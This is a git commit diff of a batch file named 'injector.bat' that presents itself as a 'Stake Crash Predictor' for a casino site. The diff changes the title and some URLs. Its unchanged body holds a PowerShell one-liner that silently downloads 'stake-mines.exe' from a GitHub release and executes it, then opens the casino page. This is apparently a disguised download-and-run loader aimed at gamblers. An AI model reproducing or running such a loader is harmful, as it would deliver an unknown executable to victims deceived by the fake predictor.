24aaa403cae57c521dcb5f73b560072c70bac9b1
IW-CommunityXStake-Predictor <mike-tyson@gmx.fr>
2024-07-19 15:25:18 +0200

    Update injector.bat

--- injector.bat
+++ injector.bat
@@ -1,13 +1,13 @@
 @echo off
 
-title Stake Mines Predictor
+title Stake Crash Predictor
 rem You can do any color
 color 0c
 
 echo.
-echo Coded By https://github.com/Stake-Predictor-IW
+echo Coded By https://github.com/IW-CommunityXStake-Predictor
 echo.
 
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Predictor-IW/Stake-mines-predictor/releases/download/Stake-mines/stake-mines.exe';$file='stake-mines.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 
-start https://stake.com/fr/casino/games/mines
+start https://stake.com/fr/casino/games/crash
